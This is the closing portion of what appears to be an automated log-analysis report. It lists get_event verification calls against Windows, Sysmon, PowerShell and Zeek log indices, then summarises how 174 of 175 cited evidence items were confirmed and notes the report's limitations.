| q-98ca82b625 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-7ed460ca2c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aXJ"} | None |  |
| q-49a19443d9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-22391f7203 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-2289311347 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-b2447b15fc | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-6d3c5e9c7f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-97e048451c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-c839bf0ac2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-f3bcfeb67a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_Zth"} | None |  |
| q-bfdd3940af | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRllBR"} | None |  |
| q-7637fc2bab | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYi0"} | None |  |
| q-841dc696ae | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjk"} | None |  |
| q-05efc7534e | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rp"} | None |  |
| q-73e796c5ed | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-6e064a6614 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-f0e6eacbee | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8TL"} | None |  |
| q-18b22320b3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-c158d14ace | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUGBlWZ"} | None |  |
| q-9e24e93f4f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-4039ad80ef | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-53ac59449e | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-436af2a4c1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-fe7a79148f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-bbccafe62d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-9d0dcbf335 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-327a572423 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-e79cbead27 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-5f816776b7 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoZN"} | None |  |
| q-0e91b4f70c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhp5i"} | None |  |
| q-f3acfa8520 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPCxFs-"} | None |  |
| q-12807830ba | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTPA5kN"} | None |  |
| q-024354c3e1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPO_TIA"} | None |  |
| q-ab9f8687ac | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPJ5Bh7"} | None |  |
| q-3a7b376b4a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-7f1ee5b28a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK66ha"} | None |  |
| q-e35b7af2aa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK6qjB"} | None |  |
| q-80a229a070 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK6qid"} | None |  |
| q-771703465e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |
| q-f0640f4a5f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |

## Verification

Evidence items cited: 175; confirmed against the stored events: 174; rejected: 1. Each item was re-fetched with get_event; it is confirmed only if the event exists, the cited field holds the cited value, and the cited query_id is a query of this run that returned that event.
Evidence sent back to the agents for correction during the run: 8 item(s) in 5 submission(s) (one correction round each; what still failed was rejected).

## Limitations

- Findings describe what the stored logs show; activity these sources did not log cannot be seen.
- Datasets with non-overlapping time windows (see Data examined) were analysed separately.
- Long field values are shortened in this report; full events are retrievable by _index/_id.
